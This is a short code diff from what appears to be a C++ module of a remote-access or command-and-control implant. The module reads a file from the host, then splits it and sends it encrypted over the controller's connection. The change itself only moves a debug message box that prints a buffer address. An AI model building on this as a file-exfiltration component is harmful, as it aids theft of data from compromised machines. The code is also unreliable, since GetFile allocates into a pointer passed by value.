@@ -17,6 +17,7 @@ ULONG GetFile(PUCHAR dataBlob, LPCSTR filePath)
         FILE_ATTRIBUTE_NORMAL,
         NULL);
 
+
     ULONG dataSz = GetFileSize(hFile, 0);
 
     dataBlob = new unsigned char[dataSz];
@@ -27,6 +28,10 @@ ULONG GetFile(PUCHAR dataBlob, LPCSTR filePath)
         dataSz,
         &dwBytesReaded,
         NULL);
+
+    char buf[256];
+    sprintf(buf, "0x%llx", dataBlob);
+    MessageBoxA(0, buf, 0, 0);
 
     CloseHandle(hFile);
 
@@ -79,11 +84,8 @@ extern "C" __declspec(dllexport) ULONG ModuleEntrypoint(MODULE_CONTEXT ctx) {
     ULONG file_size = GetFile(file_buf, ctx.argv.at(0).c_str());
     response.file_size = file_size;
     response.part_count = part_count(file_size);
+
 	ctx.send_encrypted(ctx.aes_key, ctx.iv_key, ctx.connection, (char*)&response, sizeof(response));
-    
-    char buf[256];
-    sprintf(buf, "0x%llx", file_buf);
-    MessageBoxA(0, buf, 0, 0);
 
     auto pt_array = split_file(file_buf, file_size);
     for (int i = 0; i < part_count(file_size); i++)
